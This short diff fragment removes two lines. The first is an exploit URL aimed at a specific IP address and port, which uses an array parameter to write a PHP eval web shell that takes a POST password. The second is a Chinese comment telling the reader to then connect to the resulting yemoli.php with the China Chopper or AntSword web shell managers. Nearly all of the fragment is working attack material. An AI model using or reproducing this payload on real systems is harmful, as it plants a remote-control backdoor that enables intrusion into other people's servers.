@@ -1,2 +1,0 @@
-http://117.139.247.14:9553/index.php?yemoli[0]=<?&yemoli[1]=php eval($_POST[xbt]);?>
-//再用菜刀或者蚁剑访问http://117.139.247.14:9553/yemoli.php即可
